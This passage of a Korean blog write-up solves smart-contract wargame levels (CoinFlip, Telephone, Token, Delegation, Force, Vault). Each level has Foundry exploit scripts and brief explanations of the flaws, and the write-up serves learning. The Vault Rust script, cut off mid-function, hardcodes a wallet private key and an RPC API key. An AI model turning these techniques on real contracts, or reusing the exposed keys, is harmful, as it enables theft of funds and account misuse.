</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">CoinFlip</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0xc04BBfFD13EF6aE9701644e219db8940b256B1A3</span><span class="p">;</span>
    <span class="nx">uint256</span> <span class="nx">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
    <span class="nx">CoinFlip</span> <span class="kr">public</span> <span class="nx">coinFlipContract</span><span class="p">;</span>

    <span class="nf">constructor </span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">coinFlipContract</span> <span class="o">=</span> <span class="nc">CoinFlip</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">uint256</span> <span class="nx">blockValue</span> <span class="o">=</span> <span class="nf">uint256</span><span class="p">(</span><span class="nf">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
        <span class="nx">uint256</span> <span class="nx">coinFlip</span> <span class="o">=</span> <span class="nx">blockValue</span> <span class="o">/</span> <span class="nx">FACTOR</span><span class="p">;</span>
        <span class="nx">bool</span> <span class="nx">side</span> <span class="o">=</span> <span class="nx">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">?</span> <span class="kc">true</span> <span class="p">:</span> <span class="kc">false</span><span class="p">;</span>
        <span class="nx">bool</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">coinFlipContract</span><span class="p">.</span><span class="nf">flip</span><span class="p">(</span><span class="nx">side</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">RESULT : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">result</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">consecutiveWins : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">coinFlipContract</span><span class="p">.</span><span class="nf">consecutiveWins</span><span class="p">());</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// srcript/exploit.sol</span>

<span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Exploit</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Exploit</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Exploit</span><span class="p">();</span>
        <span class="nx">exploit</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<p>처음에 EOA에서 해줬는데 EOA는 단순한 키-페어 구조로 작동하며, 트랜잭션이 네트워크에서 처리되는 동안 새로운 블록이 생성되므로, 블록이 생성된 직후 정확한 동기화가 안 되어서 코드가 잘 실행이 안 되는 거 같았다. 그래서 CA에서 위와 같이 해주었다. 그리고 문제 내에서 이전에 사용한 블록을 재 사용할 수 없어서 다음 블록이 생성된 이후에 게임을 시작해야 하는데 쉘 코드에서는 한 번에 10번 다 돌려줘서 <code class="language-plaintext highlighter-rouge">revert()</code> 난다. <code class="language-plaintext highlighter-rouge">sleep()</code> 함수 더 길게 해주면 되긴 한다.</p>

<h2 id="telephone"><span class="me-2">Telephone</span><a href="#telephone" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><a href="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2Fbc0107ac-77b2-4b20-bedc-50448a33e94a%2Fimage.png/size/w=2000?exp=1737102677&amp;sig=owMLAZ85X6Rg7UXblzFrriZqwONxNHS5-JVSSUZ9lQo" class="popup img-link  shimmer"><img src="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2Fbc0107ac-77b2-4b20-bedc-50448a33e94a%2Fimage.png/size/w=2000?exp=1737102677&amp;sig=owMLAZ85X6Rg7UXblzFrriZqwONxNHS5-JVSSUZ9lQo" alt="" loading="lazy"></a></p>

<p>EOA에서 컨트랙트 A를 호출하고, 이 컨트랙트 A 가 컨트랙트 B를 호출하면 컨트랙트 B에서의 <code class="language-plaintext highlighter-rouge">tx.origin</code>은 컨트랙트 A의 주소가 아닌 트랜잭션을 처음만든 EOA에 주소가 된다.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Telephone</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0x8f41fFC005899599Fb0b44BDdeC442Fe45B5aD3D</span><span class="p">;</span>
    <span class="nx">Telephone</span> <span class="kr">public</span> <span class="nx">phone</span><span class="p">;</span>

    <span class="nf">constructor </span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">phone</span> <span class="o">=</span> <span class="nc">Telephone</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Owner Addr before ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">phone</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="nx">phone</span><span class="p">.</span><span class="nf">changeOwner</span><span class="p">(</span><span class="mh">0x3a7D6Bc6f933eB5207c5C4Fe5ef47ad63815919c</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Owner Addr after ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">phone</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>

<span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Exploit</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Exploit</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Exploit</span><span class="p">();</span>
        <span class="nx">exploit</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test.Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="token"><span class="me-2">Token</span><a href="#token" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Token</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0xBAf4590CeCa6A10362C25Ac2a4fd9b7e1A1D6065</span><span class="p">;</span>
    <span class="nx">address</span> <span class="nx">MY_ADDR</span> <span class="o">=</span> <span class="mh">0x3a7D6Bc6f933eB5207c5C4Fe5ef47ad63815919c</span><span class="p">;</span>
    <span class="nx">Token</span> <span class="kr">public</span> <span class="nx">token</span><span class="p">;</span>

    <span class="nf">constructor </span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">token</span> <span class="o">=</span> <span class="nc">Token</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">My balance, before ex: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">token</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">MY_ADDR</span><span class="p">));</span>
        <span class="nx">token</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">MY_ADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">My balance, after ex: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">token</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">MY_ADDR</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>

<span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Exploit</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Exploit</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Exploit</span><span class="p">();</span>
        <span class="nx">exploit</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<p>언더플로우 취약점이 발생하기 때문에 자금이 없는 계정에서도 원하는 사람에게 무한대로 전송이 가능하다.</p>

<h2 id="delegation"><span class="me-2">Delegation</span><a href="#delegation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Delegation</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0x771698805328945D632A0bF6533A18625efbF412</span><span class="p">;</span>
    <span class="nx">Delegation</span> <span class="kr">public</span> <span class="nx">dele</span><span class="p">;</span>


    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>

        <span class="nx">dele</span> <span class="o">=</span> <span class="nc">Delegation</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">);</span>

        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Owner address, before ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dele</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="o">=</span> <span class="nx">CHALLENGE_ADDR</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">pwn()</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Owner address, after ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dele</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">delegatecall()</code> 함수는 <code class="language-plaintext highlighter-rouge">call()</code> 함수와 비슷한 Low Level 함수이다.  컨트랙트 A에서 <code class="language-plaintext highlighter-rouge">delegatecall()</code> 함수를 실행해 컨트랙트 B의 함수를 호출하여  스토리지 변경을 시도하면 컨트랙트 A의 스토리지가 실행된다. 또한 <code class="language-plaintext highlighter-rouge">call()</code> 함수로 전달된 Context(msg.sender, msg.data, 등 등)는 <code class="language-plaintext highlighter-rouge">delegstecall()</code>에서도 유지되기 때문에 EOA 또는 상위 컨트랙트의 주소가 공격자의 주소여야 한다.</p>

<h2 id="force"><span class="me-2">Force</span><a href="#force" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0x8380390b25487B1Bb7C5D5C1709B96d5b8fBec2a</span><span class="p">;</span>
 
    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{}</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Target balance, before ex: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">CHALLENGE_ADDR</span><span class="p">.</span><span class="nx">balance</span><span class="p">);</span>
        <span class="nf">selfdestruct</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>

<span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Exploit</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Exploit</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exploit</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.05</span> <span class="nx">ether</span><span class="p">}();</span>
        <span class="nx">exploit</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Payable 함수가 정의되어 있지 않은 컨트랙트에는 <code class="language-plaintext highlighter-rouge">selfdestruct()</code> 함수를 이용하여 강제로 이더를 전송해서 받을 수 있게 할 수 있다.</p>

<h2 id="vault"><span class="me-2">Vault</span><a href="#vault" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-rust highlighter-rouge"><div class="code-header">
        <span data-label-text="Rust"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre><span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">str</span><span class="p">::</span><span class="n">FromStr</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">secp256k1</span><span class="p">::</span><span class="n">SecretKey</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">web3</span><span class="p">::</span><span class="nn">signing</span><span class="p">::</span><span class="n">SecretKeyRef</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">web3</span><span class="p">::</span><span class="nn">contract</span><span class="p">::{</span><span class="n">Contract</span><span class="p">,</span> <span class="n">Options</span><span class="p">};</span>
<span class="k">use</span> <span class="nn">web3</span><span class="p">::</span><span class="nn">types</span><span class="p">::{</span><span class="n">Address</span><span class="p">,</span> <span class="n">BlockNumber</span><span class="p">,</span> <span class="n">H256</span><span class="p">,</span> <span class="n">U256</span><span class="p">};</span>

<span class="nd">#[tokio::main]</span>
<span class="k">async</span> <span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nn">web3</span><span class="p">::</span><span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span> <span class="p">{</span>
    <span class="k">let</span> <span class="n">http</span> <span class="o">=</span> <span class="nn">web3</span><span class="p">::</span><span class="nn">transports</span><span class="p">::</span><span class="nn">Http</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="s">"https://eth-sepolia.g.alchemy.com/v2/Nai14Kv-sBSyAwDaQ2QXUYxSaVPi8fNX"</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">web3</span> <span class="o">=</span> <span class="nn">web3</span><span class="p">::</span><span class="nn">Web3</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">http</span><span class="p">);</span>
    <span class="k">let</span> <span class="n">prvk</span> <span class="o">=</span> <span class="nn">SecretKey</span><span class="p">::</span><span class="nf">from_str</span><span class="p">(</span><span class="s">"d7420a930cdfbf67b841b475741e65fed7487e3483aaba1e36a48ce7b61c85c5"</span><span class="p">)</span>
        <span class="nf">.expect</span><span class="p">(</span><span class="s">"Invalid private key"</span><span class="p">);</span>
    <span class="k">let</span> <span class="n">contract_address</span><span class="p">:</span> <span class="n">Address</span> <span class="o">=</span> <span class="s">"0x8195846010d2C895a7eD59f7E0C61cD33ac5f003"</span><span class="nf">.parse</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
    <span class="k">let</span> <span class="n">contract</span> <span class="o">=</span> <span class="nn">Contract</span><span class="p">::</span><span class="nf">from_json</span><span class="p">(</span><span class="n">web3</span><span class="nf">.eth</span><span class="p">(),</span><span class="n">contract_address</span><span class="p">,</span> <span class="nd">include_bytes!</span><span class="p">(</span><span class="s">"/home/pocas/web3.0/abi/abi.json"</span><span class="p">),)</span><span class="nf">.expect</span><span class="p">(</span><span class="s">"Failed to load ABI"</span><span class="p">);</span>
    <span class="k">let</span> <span class="n">slot_index</span><span class="p">:</span> <span class="n">U256</span> <span class="o">=</span> <span class="nn">U256</span><span class="p">::</span><span class="nf">from</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">block</span> <span class="o">=</span> <span class="nf">Some</span><span class="p">(</span><span class="nn">BlockNumber</span><span class="p">::</span><span class="n">Latest</span><span class="p">);</span>
    <span class="k">let</span> <span class="n">storage_value</span><span class="p">:</span> <span class="n">H256</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.storage</span><span class="p">(</span><span class="n">contract_address</span><span class="p">,</span> <span class="n">slot_index</span><span class="p">,</span> <span class="n">block</span><span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>

    <span class="nd">println!</span><span class="p">(</span><span class="s">"Storage at slot {}: {:?}"</span><span class="p">,</span> <span class="n">slot_index</span><span class="p">,</span> <span class="n">storage_value</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">base_gas_price</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.gas_price</span><span class="p">()</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
    <span class="k">let</span> <span class="n">increased_gas_price</span> <span class="o">=</span> <span class="n">base_gas_price</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">/</span> <span class="mi">10</span><span class="p">;</span>
    <span class="nd">println!</span><span class="p">(</span><span class="s">"Current gas price: {}"</span><span class="p">,</span> <span class="n">base_gas_price</span><span class="p">);</span>

    <span class="k">let</span> <span class="n">tx</span> <span class="o">=</span> <span class="n">contract</span>
    <span class="nf">.signed_call</span><span class="p">(</span>
        <span class="s">"unlock"</span><span class="p">,</span>
        <span class="p">(</span><span class="n">storage_value</span><span class="p">,</span> <span class="p">),</span>
        <span class="n">Options</span> <span class="p">{</span>
            <span class="n">value</span><span class="p">:</span> <span class="nf">Some</span><span class="p">(</span><span class="nn">U256</span><span class="p">::</span><span class="nf">exp10</span><span class="p">(</span><span class="mi">14</span><span class="p">)),</span>
            <span class="n">gas_price</span><span class="p">:</span>  <span class="nf">Some</span><span class="p">(</span><span class="n">increased_gas_price</span><span class="p">),</span>
            <span class="n">gas</span><span class="p">:</span> <span class="nf">Some</span><span class="p">(</span><span class="mi">500_000</span><span class="nf">.into</span><span class="p">()),</span>
            <span class="o">..</span><span class="nn">Default</span><span class="p">::</span><span class="nf">default</span><span class="p">()</span>
        <span class="p">},</span>
        <span class="nn">SecretKeyRef</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prvk</span><span class="p">),</span>
    <span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>

    <span class="nd">println!</span><span class="p">(</span><span class="s">"Transaction sent for unlock: {:?}"</span><span class="p">,</span> <span class="n">tx</span><span class="p">);</span>

    <span class="nn">tokio</span><span class="p">::</span><span class="nn">time</span><span class="p">::</span><span class="nf">sleep</span><span class="p">(</span><span class="nn">std</span><span class="p">::</span><span class="nn">time</span><span class="p">::</span><span class="nn">Duration</span><span class="p">::</span><span class="nf">from_secs</span><span class="p">(</span><span class="mi">15</span><span class="p">))</span><span class="k">.await</span><span class="p">;</span>
